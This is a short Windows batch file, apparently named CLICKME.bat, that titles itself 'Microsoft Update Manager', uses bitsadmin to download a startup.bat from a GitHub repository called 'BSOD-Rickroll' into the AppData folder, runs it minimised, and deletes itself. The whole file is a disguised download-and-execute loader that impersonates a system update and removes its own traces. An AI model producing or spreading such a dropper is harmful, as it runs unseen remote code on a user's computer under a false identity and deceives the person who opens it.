@echo off
title Microsoft Update Manager
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Online/startup.bat" "%AppData%\startup.bat"
start /min %AppData%\startup.bat
del CLICKME.bat
